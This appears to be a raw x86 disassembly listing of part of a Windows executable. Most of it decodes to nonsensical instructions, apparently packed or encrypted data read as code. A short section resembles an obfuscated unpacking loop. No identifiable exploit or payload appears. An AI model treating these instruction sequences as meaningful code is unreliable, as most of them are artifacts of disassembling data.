  40891c:	retf   0xdc01
  40891f:	ror    BYTE PTR gs:[ecx],0xbc
  408923:	jmp    0xa1846a0f
  408928:	or     al,0xa2
  40892a:	push   edx
  40892b:	dec    esp
  40892c:	into   
  40892d:	mov    eax,0x31510307
  408932:	jg     0x408950
  408934:	xchg   DWORD PTR [ecx+0x32],edi
  408937:	dec    esp
  408938:	sbb    ebp,DWORD PTR [esp+ebx*4-0x1b8949a8]
  40893f:	enter  0xc775,0xfc
  408943:	push   eax
  408944:	enter  0x3de6,0x78
  408948:	test   eax,0xad7471e9
  40894d:	xchg   ebx,eax
  40894e:	pop    ecx
  40894f:	shl    bh,1
  408951:	sub    DWORD PTR [eax-0x4f],ecx
  408954:	and    al,0xfa
  408956:	lds    eax,FWORD PTR [esi-0x2eb2925]
  40895c:	loopne 0x40890c
  40895e:	pop    ss
  40895f:	inc    eax
  408960:	fisttp DWORD PTR [edi-0x73122262]
  408966:	in     eax,dx
  408967:	dec    esp
  408968:	shr    BYTE PTR [ecx-0x3977e3dd],cl
  40896e:	inc    BYTE PTR [ebp-0xd]
  408971:	xchg   BYTE PTR [edx-0x23],dl
  408974:	call   0x25126c58
  408979:	out    0x9c,eax
  40897b:	dec    esi
  40897c:	outs   dx,DWORD PTR ds:[esi]
  40897d:	je     0x408938
  40897f:	push   esp
  408980:	nop
  408981:	push   ebx
  408982:	(bad)  
  408983:	das    
  408984:	jge    0x40892a
  408986:	mov    ah,0x54
  408988:	push   ds
  408989:	pop    ecx
  40898a:	push   cs
  40898b:	loopne 0x408943
  40898d:	and    ebp,DWORD PTR [edx+0x1c429da1]
  408993:	jno    0x40899d
  408995:	and    DWORD PTR [edi+0x60cb253],0xffffffc8
  40899c:	retf   0x1be0
  40899f:	fnsave [ecx]
  4089a1:	in     eax,0xd
  4089a3:	jae    0x40898d
  4089a5:	inc    ecx
  4089a6:	mov    cl,0xff
  4089a8:	mov    esp,0x60891b80
  4089ad:	cmp    ebx,DWORD PTR [edi+edx*8+0x6e]
  4089b1:	jmp    0x305d:0x27ab9ce1
  4089b8:	fcmovne st,st(7)
  4089ba:	stos   DWORD PTR es:[edi],eax
  4089bb:	dec    edx
  4089bc:	scas   al,BYTE PTR es:[edi]
  4089bd:	arpl   ax,si
  4089bf:	call   0xc9504948
  4089c4:	adc    ah,bh
  4089c6:	push   ebx
  4089c7:	mov    BYTE PTR [ecx-0x2f],bl
  4089ca:	enter  0xee6a,0xab
  4089ce:	xor    ecx,edi
  4089d0:	jp     0x4089e6
  4089d2:	mov    edx,DWORD PTR [edi]
  4089d4:	jp     0x408959
  4089d6:	adc    al,0x65
  4089d8:	mov    ds:0x434f3c82,eax
  4089dd:	repz jecxz 0x408987
  4089e0:	sti    
  4089e1:	xchg   edx,eax
  4089e2:	pop    edi
  4089e3:	and    eax,0x94c5d8e9
  4089e8:	out    0x72,al
  4089ea:	test   ecx,edx
  4089ec:	mov    ecx,0xf9e22ea
  4089f1:	das    
  4089f2:	inc    edi
  4089f3:	add    edx,esi
  4089f5:	sbb    cl,dl
  4089f7:	in     al,0xc2
  4089f9:	fimul  WORD PTR [ebx+0x2c464b1d]
  4089ff:	mov    ebp,0xe8ff7654
  408a04:	jbe    0x408a4b
  408a06:	add    ch,BYTE PTR [esi+eiz*2+0x30ede7ce]
  408a0d:	cdq    
  408a0e:	iret   
  408a0f:	leave  
  408a10:	add    eax,DWORD PTR [ebp-0x181cb97d]
  408a16:	paddsw mm2,mm4
  408a19:	mov    bh,0x98
  408a1b:	ins    DWORD PTR es:[edi],dx
  408a1c:	mov    ds:0xc13c4265,al
  408a21:	in     eax,dx
  408a22:	pop    edi
  408a23:	sub    BYTE PTR ds:0xbe0ad285,al
  408a29:	je     0x408a37
  408a2b:	mov    cl,0x71
  408a2d:	sbb    al,0x39
  408a2f:	neg    BYTE PTR [ebp-0x6d]
  408a32:	test   eax,0x338e9409
  408a37:	dec    esp
  408a38:	call   DWORD PTR [ebx+edx*4]
  408a3b:	dec    ebx
  408a3c:	inc    eax
  408a3d:	jl     0x4089d4
  408a3f:	push   ecx
  408a40:	cmp    DWORD PTR [ebp+0x30],0xdc21a500
  408a47:	std    
  408a48:	sbb    al,0xb8
  408a4a:	dec    esp
  408a4b:	mov    edx,0xce23d600
  408a50:	(bad)  
  408a51:	jo     0x408acd
  408a53:	sbb    eax,0x2fe7c4cf
  408a58:	repz gs addr16 in eax,dx
  408a5c:	mov    ds:0x44ef7325,al
  408a61:	in     al,0xfa
  408a63:	pusha  
  408a64:	aad    0x4
  408a66:	push   esi
  408a67:	mov    ebp,0xcf109851
  408a6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a6d:	sbb    ebp,DWORD PTR [ebx]
  408a6f:	mov    DWORD PTR [ecx],eax
  408a71:	pop    esi
  408a72:	leave  
  408a73:	ret    0xc
  408a76:	push   ebp
  408a77:	mov    ebp,esp
  408a79:	push   ecx
  408a7a:	xor    eax,0x6036
  408a7f:	push   ecx
  408a80:	jmp    0x408d46
  408a85:	(bad)  
  408a86:	cmp    eax,0xd6d5cec5
  408a8b:	aad    0xc5
  408a8d:	mov    esi,0x24b3a4f9
  408a92:	fnstcw WORD PTR [edi+0x78e438cd]
  408a98:	js     0x408a41
  408a9a:	jle    0x408b14
  408a9c:	js     0x408ad9
  408a9e:	das    
  408a9f:	push   esi
  408aa0:	dec    eax
  408aa1:	cmp    al,0x2
  408aa3:	mov    edx,0xcb34e5d3
  408aa8:	inc    esp
  408aa9:	call   0x900:0xd840391
  408ab0:	in     al,0x98
  408ab2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408ab3:	xor    ecx,DWORD PTR [ebx]
  408ab5:	iret   
  408ab6:	popf   
  408ab7:	dec    eax
  408ab8:	sbb    ecx,DWORD PTR [ecx+0x4cd35a4f]
  408abe:	popf   
  408abf:	aam    0x9f
  408ac1:	fsub   DWORD PTR [eax]
  408ac3:	and    bh,bl
  408ac5:	pop    ecx
  408ac6:	fsubr  DWORD PTR [ebx]
  408ac8:	jne    0x408b48
  408aca:	mov    ebx,0x34353e7f
  408acf:	or     ebx,DWORD PTR [ecx+0xa]
  408ad2:	lods   eax,DWORD PTR ds:[esi]
  408ad3:	pop    edx
  408ad4:	xor    eax,0x6f13279
  408ad9:	push   ebx
  408ada:	out    0x8e,eax
  408adc:	sar    DWORD PTR [eax-0x3b],1
  408adf:	jmp    0x2a7f:0x613e4d40
  408ae6:	sahf   
  408ae7:	add    eax,0x34969e59
  408aec:	hlt    
  408aed:	stc    
  408aee:	movd   mm7,DWORD PTR [esi-0x35c6336e]
  408af5:	mov    ch,0x62
  408af7:	sbb    ch,bl
  408af9:	(bad)  
  408afa:	loopne 0x408ac7
  408afc:	loop   0x408b52
  408afe:	pop    esi
  408aff:	dec    esp
  408b00:	xor    BYTE PTR [edx+edi*1],ch
  408b03:	mov    esp,0x331cdd9
  408b08:	pop    esi
  408b09:	jns    0x408b6a
  408b0b:	mov    bh,0xb6
  408b0d:	add    eax,ebx
  408b0f:	(bad)  
  408b11:	mov    ah,0xae
  408b13:	xchg   ebx,eax
  408b14:	out    dx,al
  408b15:	push   esp
  408b16:	inc    eax
  408b17:	sbb    BYTE PTR [ebp-0x1c3fd959],dh
  408b1d:	cmc    
  408b1e:	xor    ebp,DWORD PTR [edx+0x6c6be41]
  408b24:	dec    ebx
  408b25:	cmp    edi,ebx
  408b27:	ins    BYTE PTR es:[edi],dx
  408b28:	(bad)  
  408b2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b2b:	shl    DWORD PTR [edx+0x22],cl
  408b2e:	cld    
  408b2f:	mov    bh,0x7
  408b31:	push   eax
  408b32:	test   BYTE PTR [eax],dh
  408b34:	mov    ebp,DWORD PTR [edx]
  408b36:	cli    
  408b37:	sub    dl,BYTE PTR [eax+eiz*4]
  408b3a:	in     al,dx
  408b3b:	sub    cl,BYTE PTR [edi+0x6d]
  408b3e:	cli    
  408b3f:	or     bl,BYTE PTR ds:0x8ff47670
  408b45:	test   al,0xc8
  408b47:	inc    esp
  408b48:	mov    al,0x6c
  408b4a:	icebp  
  408b4b:	xchg   ebp,eax
  408b4c:	sub    ah,BYTE PTR [ebp+0x38754acb]
  408b52:	popa   
  408b53:	div    BYTE PTR [edi]
  408b55:	push   ebx
  408b56:	pop    ds
  408b57:	sbb    DWORD PTR [eax],edi
  408b59:	jp     0x408bd4
  408b5b:	cmp    DWORD PTR [edi-0xfc0bcfa],edi
  408b61:	jg     0x408aea
  408b63:	xlat   BYTE PTR ds:[ebx]
  408b64:	test   eax,0xbd1a6cc8
  408b69:	xlat   BYTE PTR ds:[ebx]
  408b6a:	push   edx
  408b6b:	push   ebp
  408b6c:	(bad)  
  408b6e:	imul   eax,DWORD PTR [ebx-0x45014771],0xffffffb9
  408b75:	and    BYTE PTR [ebp+eiz*4-0x75],al
  408b79:	aad    0xed
  408b7b:	inc    ebp
  408b7c:	imul   DWORD PTR [edx+0x4e]
  408b7f:	out    dx,eax
  408b80:	(bad)  
  408b81:	mov    dl,0x8b
  408b83:	test   BYTE PTR [ebp+0x18],cl
  408b86:	daa    
  408b87:	arpl   WORD PTR [ebx+0x22],si
  408b8a:	int    0x9a
  408b8c:	and    DWORD PTR [ebp+edx*8-0x2e],0xffffffc6
  408b91:	(bad)  
  408b93:	mov    ds:0x1eda7797,eax
  408b98:	sti    
  408b99:	jl     0x408b9f
  408b9b:	gs daa 
  408b9d:	repz lahf 
  408b9f:	test   al,0xe2
  408ba1:	sbb    eax,0x862ee8de
  408ba6:	cli    
  408ba7:	clc    
  408ba8:	pop    ecx
  408ba9:	xchg   ebx,eax
  408baa:	pop    edx
  408bab:	mov    ds:0x64ae22fd,eax
  408bb0:	test   edx,0x732c0fb5
  408bb6:	jae    0x408c14
  408bb8:	push   eax
  408bb9:	cmp    esp,DWORD PTR [edx]
  408bbb:	inc    ebx
  408bbc:	daa    
  408bbd:	mov    bl,0x7e
  408bbf:	push   cs
  408bc0:	or     BYTE PTR [esi+0x2c],ch
  408bc3:	or     al,0x5e
  408bc5:	mov    ch,0x38
  408bc7:	inc    esp
  408bc8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408bc9:	int3   
  408bca:	sbb    dl,ch
  408bcc:	aas    
  408bcd:	mov    ds:0x29c4b401,eax
  408bd2:	cs mov edi,0x9006211f
  408bd8:	sti    
  408bd9:	int    0xd7
  408bdb:	jge    0x408ba6
  408bdd:	adc    al,0x4a
  408bdf:	jecxz  0x408bcc
  408be1:	fild   WORD PTR [eax-0x715b8c30]
  408be7:	xchg   ebp,eax
  408be8:	inc    esp
  408be9:	mov    cl,0x60
  408beb:	xchg   ebx,ecx
  408bed:	inc    ecx
  408bee:	shl    bh,0x49
  408bf1:	pop    ebp
  408bf2:	mul    ebp
  408bf4:	out    0x63,eax
  408bf6:	lods   al,BYTE PTR ds:[esi]
  408bf7:	scas   al,BYTE PTR es:[edi]
  408bf8:	cs nop
  408bfa:	fdiv   QWORD PTR [ebp+esi*1-0xfa82644]
  408c01:	popa   
  408c02:	data16 or al,0x18
  408c05:	test   eax,0x91ff1a14
  408c0a:	jae    0x408b97
  408c0c:	xor    eax,0x1f41de81
  408c11:	(bad)  
  408c12:	mov    eax,0x1937bfc7
  408c17:	daa    
  408c18:	xchg   esp,eax
  408c19:	pop    eax
  408c1a:	lds    ebx,FWORD PTR ds:0xbf081b98
  408c20:	ret    0x79bb
  408c23:	jecxz  0x408c95
  408c25:	sub    eax,0xe2ec3597
  408c2a:	fst    st(5)
  408c2c:	sar    DWORD PTR [edi+ebx*8-0x61],cl
  408c30:	fistp  WORD PTR [eax+ebp*8-0xb786bb6]
  408c37:	push   ecx
  408c38:	ret    
  408c39:	(bad)  
  408c3a:	xchg   ecx,eax
  408c3b:	sbb    DWORD PTR [edi],esi
  408c3d:	or     ah,bh
  408c3f:	sub    BYTE PTR [ebp+0x42],cl
  408c42:	dec    esp
  408c43:	xor    eax,0xfb2ee086
  408c48:	push   ds
  408c49:	xchg   DWORD PTR [esp-0x26],esp
  408c4d:	cwde   
  408c4e:	dec    ebx
  408c4f:	mov    bl,0xe8
  408c51:	int3   
  408c52:	add    al,0xc2
  408c54:	mov    ds:0x45012dca,eax
  408c59:	mov    edx,DWORD PTR [ecx-0x78]
  408c5c:	fidiv  WORD PTR ds:0x42dd5e04
  408c62:	aaa    
  408c63:	loope  0x408bf4
  408c65:	bound  edi,QWORD PTR [ebp-0x1d]
  408c68:	dec    ebp
  408c69:	push   ds
  408c6a:	adc    DWORD PTR [eax-0x2c],0xc75eb532
  408c71:	push   es
  408c72:	xchg   ebp,eax
  408c73:	inc    ebp
  408c74:	cmp    al,0x39
  408c76:	cmp    eax,0xd3dc15cb
  408c7b:	mov    ds:0x69b9aa7a,al
  408c80:	push   cs
  408c81:	clc    
  408c82:	jo     0x408c0c
  408c84:	aam    0xbd
  408c86:	cmp    eax,DWORD PTR [ecx-0x2b6c0f7a]
  408c8c:	jmp    0x7a10a7e5
  408c91:	aam    0x7c
  408c93:	xor    eax,0x5a092169
  408c98:	call   0x57d07dd1
  408c9d:	mov    ah,0x15
  408c9f:	enter  0xc9ae,0xa2
  408ca3:	ja     0x408c29
  408ca5:	sbb    dh,BYTE PTR [edx]
  408ca7:	(bad)
  408caa:	cmp    eax,0x74288922
  408caf:	shr    DWORD PTR [eax],cl
  408cb1:	pop    esp
  408cb2:	sub    al,0x95
  408cb4:	push   edi
  408cb5:	jecxz  0x408d0f
  408cb7:	dec    edi
  408cb8:	mov    dl,0x28
  408cba:	inc    esp
  408cbb:	lods   eax,DWORD PTR ds:[esi]
  408cbc:	outs   dx,BYTE PTR ds:[esi]
  408cbd:	and    DWORD PTR [ebp-0x17],edi
  408cc0:	jmp    0x4b0f:0xe72c9799
  408cc7:	mov    al,0x39
  408cc9:	lds    edi,FWORD PTR [esi]
  408ccb:	dec    edx
  408ccc:	xor    bh,BYTE PTR es:[edx-0x5a477e4c]
  408cd3:	loopne 0x408d23
  408cd5:	fistp  QWORD PTR [edx-0x60]
  408cd8:	pop    esp
  408cd9:	jle    0x408cb4
  408cdb:	jo     0x408c60
  408cdd:	mov    al,0x27
  408cdf:	adc    DWORD PTR [ecx-0xd748a37],esi
  408ce5:	adc    ch,bl
  408ce7:	rcl    DWORD PTR [ebx+0x17],cl
  408cea:	dec    esp
  408ceb:	sbb    al,0x47
  408ced:	popa   
  408cee:	push   edi
  408cef:	pop    esp
  408cf0:	das    
  408cf1:	mov    ebp,0xbb978a94
  408cf6:	push   ss
  408cf7:	xor    al,0x10
  408cf9:	clc    
  408cfa:	aam    0xbc
  408cfc:	inc    ecx
  408cfd:	xchg   ebp,eax
  408cfe:	cwde   
  408cff:	cli    
  408d00:	icebp  
  408d01:	mov    bl,0xdd
  408d03:	sbb    eax,0x4b34b0ad
  408d08:	mov    ah,0x5c
  408d0a:	jle    0x408d62
  408d0c:	lods   al,BYTE PTR ds:[esi]
  408d0d:	test   DWORD PTR [ecx-0x5424775a],ebx
  408d13:	in     eax,dx
  408d14:	xchg   esp,eax
  408d15:	or     ebx,esi
  408d17:	popf   
  408d18:	lods   eax,DWORD PTR ds:[esi]
  408d19:	test   al,0xec
  408d1b:	test   dh,bh
  408d1d:	mov    ebx,0xe39d1bf6
  408d22:	push   ds
  408d23:	(bad)  
  408d24:	adc    eax,0x8cdf4a65
  408d29:	icebp  
  408d2a:	adc    BYTE PTR [ecx-0x49],bl
  408d2d:	ins    BYTE PTR es:[edi],dx
  408d2e:	mov    eax,ds:0x803c0c56
  408d33:	jmp    0xd9c0:0xf6384500
  408d3a:	cmp    eax,0xc26a1779
  408d3f:	aas    
  408d40:	cld    
  408d41:	addr16 dec esp
  408d43:	adc    DWORD PTR [edi-0x59],edi
  408d46:	mov    DWORD PTR [ebp-0x8],0xf89c8538
  408d4d:	mov    DWORD PTR [ebp-0x4],0xf89c8539
  408d54:	mov    eax,DWORD PTR [ebp-0x4]
  408d57:	add    edx,edx
  408d59:	push   esi
  408d5a:	mov    edx,DWORD PTR ds:0x42a86d
  408d60:	mov    edx,DWORD PTR [edx]
  408d62:	add    DWORD PTR ds:0x42a88d,edx
  408d68:	mov    esi,DWORD PTR [ebp-0x8]
  408d6b:	mov    edx,0x7510850
  408d70:	xor    eax,edx
  408d72:	xor    esi,edx
  408d74:	and    DWORD PTR ds:0x42a7c1,0x0
  408d7e:	jmp    0x408d90
  408d83:	mov    ecx,DWORD PTR ds:0x42a7c1
  408d89:	inc    ecx
  408d8a:	mov    DWORD PTR ds:0x42a7c1,ecx
  408d90:	cmp    DWORD PTR ds:0x42a7c1,0x19
  408d97:	jae    0x408de8
  408d9d:	cmp    DWORD PTR ds:0x42a7c1,0x7
  408da4:	jne    0x408db5
  408daa:	push   0x67a5
  408daf:	call   DWORD PTR ds:0x41d0c8
  408db5:	cmp    DWORD PTR ds:0x42a7c1,0x6
  408dbc:	jne    0x408dd1
  408dc2:	xor    ecx,ecx
  408dc4:	add    ecx,DWORD PTR ds:0x42a7c1
  408dca:	inc    ecx
  408dcb:	mov    DWORD PTR ds:0x42a7c1,ecx
  408dd1:	jmp    0x408d83
  408dd6:	mov    ecx,DWORD PTR ds:0x42a7f5
  408ddc:	xor    ecx,DWORD PTR ds:0x42a7bd
  408de2:	mov    DWORD PTR ds:0x42a7f5,ecx
  408de8:	mov    ecx,0x327298
  408ded:	or     DWORD PTR ds:0x42a809,0x42a765
  408df7:	add    esi,ecx
  408df9:	add    eax,ecx
  408dfb:	xor    DWORD PTR ds:0x42a77d,0x42a7f9
  408e05:	imul   eax,esi
  408e08:	mov    esi,DWORD PTR [ebp+0xc]
  408e0b:	jmp    0x4090d1
  408e10:	cmp    eax,0xcdcbcfc8
  408e15:	retf   
  408e16:	(bad)  
  408e18:	stos   DWORD PTR es:[edi],eax
  408e19:	adc    DWORD PTR [ecx+0x6e],0xffffffee
  408e1d:	popa   
  408e1e:	jno    0x408dde
  408e20:	addr16 jmp 0x7878:0x7ea77878
  408e28:	aad    0x9f
  408e2a:	aas    
  408e2b:	inc    edx
  408e2c:	pusha  
  408e2d:	mov    edi,0x87e424d4
  408e32:	ret    
  408e33:	and    esi,DWORD PTR [ecx-0x68e3a086]
  408e39:	mov    esi,0xe5b674d5
  408e3e:	jl     0x408dcd
  408e40:	and    al,0x49
  408e42:	sbb    BYTE PTR [edx+0x42f934c9],cl
  408e48:	shl    DWORD PTR [edi],cl
  408e4a:	xor    BYTE PTR [ebp+0x52],dh
  408e4d:	out    dx,al
  408e4e:	test   al,0xd7
  408e50:	xor    esi,esi
  408e52:	gs imul ebx,ebp,0x1f023984
  408e59:	adc    BYTE PTR [eax-0x75428778],dh
  408e5f:	fldenv [ebx+0x69]
  408e62:	lea    ebx,[esi]
  408e64:	mov    cl,0x2e
  408e66:	fcmovnb st,st(1)
  408e68:	jp     0x408e67
  408e6a:	pop    ss
  408e6b:	push   esp
  408e6c:	mov    si,0xff48
  408e70:	enter  0x10a5,0x81
  408e74:	and    BYTE PTR [eax+esi*4],0x68
  408e78:	stos   BYTE PTR es:[edi],al
  408e79:	fist   DWORD PTR [esi+0x60]
  408e7c:	ja     0x408ef2
  408e7e:	xor    BYTE PTR [edx-0x71a21c06],bh
  408e84:	fisttp WORD PTR [edx]
  408e86:	add    eax,0x5fc123f4
  408e8b:	std    
  408e8c:	jne    0x408f0c
  408e8e:	mov    eax,0x79daf0fd
  408e93:	xor    BYTE PTR [esi+0x743f0561],bh
  408e99:	cwde   
  408e9a:	sbb    edi,DWORD PTR [ebp+0x1735a6f3]
  408ea0:	adc    al,0x49
  408ea2:	sti    
  408ea3:	test   BYTE PTR [edi-0x53ac1872],bh
  408ea9:	es pop esp
  408eab:	mov    bl,0x98
  408ead:	les    ebx,FWORD PTR [eax]
  408eaf:	sub    BYTE PTR [ebx+0x147d08da],dl
  408eb5:	pop    eax
  408eb6:	pop    esi
  408eb7:	add    BYTE PTR [ebx],0xed
  408eba:	cmp    BYTE PTR [ebx+0x30f08e3e],ah
  408ec0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ec1:	je     0x408f01
  408ec3:	jo     0x408f07
  408ec5:	scas   eax,DWORD PTR es:[edi]
  408ec6:	fst    DWORD PTR [eax-0x5b]
  408ec9:	lods   eax,DWORD PTR ds:[esi]
  408eca:	inc    DWORD PTR [edx-0x55125cd5]
  408ed0:	enter  0xce30,0x51
  408ed4:	aad    0x4
  408ed6:	jo     0x408e6e
  408ed8:	xchg   DWORD PTR [edx+0x24c4826b],esi
  408ede:	(bad)  
  408edf:	mov    ebx,0x4e314159
  408ee4:	loop   0x408f60
  408ee6:	ds ds xor bh,cl
  408eea:	fsubr  DWORD PTR [edi]
  408eec:	ret    
  408eed:	cmc    
  408eee:	jge    0x408e87
  408ef0:	pusha  
  408ef1:	iret   
  408ef2:	jecxz  0x408f21
  408ef4:	xor    al,0xc1
  408ef6:	and    esi,esp
  408ef8:	std    
  408ef9:	aas    
  408efa:	pop    esi
  408efb:	and    esp,DWORD PTR [ecx+0x7]
  408efe:	imul   ebx,eax,0x21
  408f01:	scas   al,BYTE PTR es:[edi]
  408f02:	iret   
  408f03:	inc    esi
  408f04:	ds addr16 xor ecx,esp
  408f08:	mov    eax,ds:0xb7334b41
  408f0d:	loop   0x408eaf
  408f0f:	push   ebx
  408f10:	mov    gs:0x8eae91ea,al
  408f16:	(bad)  
  408f17:	jp     0x408f77
  408f19:	shl    ebp,1
  408f1b:	mov    al,0xbf
  408f1d:	jge    0x408f4a
  408f1f:	mov    edx,0xe698216c
  408f24:	dec    edi
  408f25:	pop    ss
  408f26:	xor    ebp,DWORD PTR [ebp-0x45]
  408f29:	jle    0x408f6f
  408f2b:	sub    al,0x41
  408f2d:	pusha  
  408f2e:	xor    eax,0xcf060b36
  408f33:	dec    esi
  408f34:	cli    
  408f35:	mov    edx,0xd7d00b49
  408f3a:	jmp    0x75e0659b
  408f3f:	aaa    
  408f40:	in     eax,0x3d
  408f42:	sub    esi,DWORD PTR [ebx+ecx*1+0x840ce21]
  408f49:	jmp    0xb7838789
  408f4e:	outs   dx,DWORD PTR ds:[esi]
  408f4f:	sbb    ch,BYTE PTR [ebx+0x35fedbc3]
  408f55:	add    edx,esi
  408f57:	rcr    BYTE PTR [eax+eax*2-0x59540da8],0xf6
  408f5f:	sbb    al,0xb0
  408f61:	scas   al,BYTE PTR es:[edi]
  408f62:	jmp    0x408f69
  408f64:	mov    ebp,0xbceaa128
  408f69:	xchg   edx,eax
  408f6a:	daa    
  408f6b:	shr    BYTE PTR [eax-0x7],cl
  408f6e:	mov    es,WORD PTR [edi-0x51]
  408f71:	out    0x88,al
  408f73:	int3   
  408f74:	xor    ch,BYTE PTR [edx]
  408f76:	sbb    eax,0x53b81b12
  408f7b:	and    edi,DWORD PTR [esi-0x6d]
  408f7e:	icebp  
  408f7f:	jp     0x408f14
  408f81:	das    
  408f82:	xchg   esp,eax
  408f83:	pop    esp
  408f84:	test   al,bl
  408f86:	jbe    0x408f8a
  408f88:	or     DWORD PTR [eax],edi
  408f8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408f8b:	push   eax
  408f8c:	push   esp
  408f8d:	test   DWORD PTR [edi],eax
  408f8f:	lods   eax,DWORD PTR ds:[esi]
  408f90:	leave  
  408f91:	rol    DWORD PTR [ebp+0x2e],cl
  408f94:	dec    ebx
  408f95:	ja     0x408f59
  408f97:	xchg   esp,eax
  408f98:	add    BYTE PTR [eax+eax*1],0x5b
  408f9c:	(bad)  
  408f9d:	adc    al,0x1e
  408f9f:	ds sub al,0xe6
  408fa3:	pop    edx
  408fa4:	xor    esp,DWORD PTR [edx-0x7cd0b999]
  408faa:	(bad)  
  408fab:	add    al,0x50
  408fad:	daa    
  408fae:	inc    edi
  408faf:	or     ebp,DWORD PTR [eax-0x63b4d20e]
  408fb5:	pushf  
  408fb6:	jne    0x408f89
  408fb8:	pop    ecx
  408fb9:	xor    DWORD PTR [esi],esi
  408fbb:	add    DWORD PTR [edx],edx
  408fbd:	icebp  
  408fbe:	out    dx,eax
  408fbf:	fstp   DWORD PTR [ebx-0x3a]
  408fc2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408fc3:	adc    ah,al
  408fc5:	sbb    dh,BYTE PTR [ebx+0x19]
  408fc8:	or     ah,BYTE PTR [ebx+0x2e5fcedf]
  408fce:	or     al,0xf1
  408fd0:	gs push eax
  408fd2:	jne    0x40904c
  408fd4:	jp     0x408f85
  408fd6:	ds dec ebp
  408fd8:	imul   ebp,DWORD PTR [esi+eiz*1],0x16d9bb79
  408fdf:	aad    0xf9
  408fe1:	popa   
  408fe2:	(bad)  
  408fe3:	aam    0xf1
  408fe5:	jnp    0x409026
  408fe7:	or     BYTE PTR [edi],ch
  408fe9:	add    BYTE PTR ds:0xdc7077b4,dl
  408fef:	sti    
  408ff0:	retf   
  408ff1:	adc    DWORD PTR [ebp+0x7a],0x108b2028
  408ff8:	bound  eax,QWORD PTR [edi+0x2e]
  408ffb:	sbb    eax,DWORD PTR [eax+0x31]
  408ffe:	(bad)  
  408fff:	mov    cl,0x36
  409001:	pinsrw mm0,WORD PTR [ebp+eiz*1+0x7e4e891b],0xa8
  40900a:	mov    ds:0x70501a1f,eax
  40900f:	js     0x408ff5
  409011:	aaa    
  409012:	call   0x67a7cf21
  409017:	push   0xffffffb3
  409019:	test   eax,0xe4659cb
  40901e:	aad    0xbc
  409020:	mov    ch,0xe5
  409022:	fadd   DWORD PTR [ecx+0x55]
  409025:	out    0x45,eax
  409027:	and    DWORD PTR [edi+esi*2+0x51],edx
  40902b:	push   ecx
  40902c:	push   cs
  40902d:	mov    ah,0x91
  40902f:	pop    ecx
  409030:	shl    BYTE PTR [edi],cl
  409032:	cmp    DWORD PTR [ebp+0xa823da4],0x619808da
  40903c:	test   al,0x57
  40903e:	adc    eax,0x1845f785
  409043:	pop    ecx
  409044:	retf   0x3de2
  409047:	std    
  409048:	mov    ds:0xaacac20d,eax
  40904d:	or     dh,BYTE PTR [ecx-0x43]
  409050:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409051:	das    
  409052:	ret    0xfef7
  409055:	cmp    dh,BYTE PTR [ebp-0x4f]
  409058:	xor    al,0x1d
  40905a:	sub    al,0x5f
  40905c:	jle    0x40907e
  40905e:	add    al,0x5
  409060:	ror    DWORD PTR [esi-0x3e],1
  409063:	aam    0xbc
  409065:	cs cdq 
  409067:	inc    edx
  409068:	imul   esi,DWORD PTR [ebp+0x5e],0xde561cda
  40906f:	movd   mm1,ebx
  409072:	icebp  
  409073:	cmp    BYTE PTR [ecx+0x6d],al
  409076:	(bad)
  409079:	adc    bl,bh
  40907b:	jo     0x409098
  40907d:	dec    edx
  40907e:	xor    al,0xd8
  409080:	sar    BYTE PTR [esi+0x1c],0xd5
  409084:	sub    eax,ebx
  409086:	leave  
  409087:	stos   DWORD PTR es:[edi],eax
  409088:	sbb    eax,0xfcb7f12d
  40908d:	mov    BYTE PTR [ecx],dl
  40908f:	pop    ecx
  409090:	adc    BYTE PTR [edx],dl
  409092:	inc    ebp
  409093:	test   edi,ebx
  409095:	lea    edx,fs:[edi-0x66]
  409099:	ins    DWORD PTR es:[edi],dx
  40909a:	loop   0x409035
  40909c:	mov    eax,0xd35a1f71
  4090a1:	paddusb mm3,mm0
  4090a4:	lahf   
  4090a5:	out    dx,al
  4090a6:	add    BYTE PTR [edx-0x5e6e3829],bh
  4090ac:	sbb    ebp,DWORD PTR cs:[ecx-0x7623f9df]
  4090b3:	mov    esp,0x44f364d1
  4090b8:	outs   dx,BYTE PTR ds:[esi]
  4090b9:	mov    esi,0xcb708338
  4090be:	mul    BYTE PTR [eax]
  4090c0:	lock sbb al,0x3c
  4090c3:	in     al,0x38
  4090c5:	adc    dl,cl
  4090c7:	push   ss
  4090c8:	mov    ch,0x0
  4090ca:	inc    eax
  4090cb:	cmp    eax,0x224233cf
  4090d0:	addr16 cmp esi,eax
  4090d3:	mov    DWORD PTR ds:0x42a801,0x7b75
  4090dd:	jne    0x4093c9
  4090e3:	jmp    0x4093a9
  4090e8:	retf   0xd0cb
  4090eb:	cmp    eax,0xcbd9d1d5
  4090f0:	mov    edx,0xd3a4c6c4
  4090f5:	ficomp DWORD PTR [ebx+0x78ef8e6c]
  4090fb:	js     0x4090a4
  4090fd:	jle    0x409177
  4090ff:	js     0x4090c1
  409101:	cmc    
  409102:	mov    al,0x5b
  409104:	add    eax,0xcc53c623
  409109:	push   ebx
  40910a:	ret    0xef1d
  40910d:	retf   0xede
  409110:	outs   dx,DWORD PTR ds:[esi]
  409111:	ja     0x4090ad
  409113:	inc    ecx
  409114:	loopne 0x4090ae
  409116:	xor    cl,ch
  409118:	sahf   
  409119:	jl     0x4090c0
  40911b:	jno    0x4090e9
  40911d:	retf   
  40911e:	sub    al,0x78
  409120:	fucomip st,st(1)
  409122:	jae    0x409159
  409124:	repz cwde 
  409126:	xor    eax,0xb7fb3e7d
  40912b:	push   edi
  40912c:	loopne 0x409146
  40912e:	(bad)  
  40912f:	daa    
  409130:	xchg   ebp,eax
  409131:	mov    ds:0xe968fe5b,eax
  409136:	push   ds
  409137:	fstp   TBYTE PTR [esi]
  409139:	pop    edx
  40913a:	push   0x24
  40913c:	adc    eax,0xa46e6b
  409141:	pushf  
  409142:	pop    ecx
  409143:	sub    DWORD PTR [ebp+0x1dee250f],esi
  409149:	and    ecx,esp
  40914b:	push   0x8fbc2791
  409150:	imul   ebx,DWORD PTR [edx],0xd9378505
  409156:	fisub  DWORD PTR [ebx]
  409158:	in     eax,0x3d
  40915a:	and    bh,BYTE PTR [edx+ebp*1-0x57]
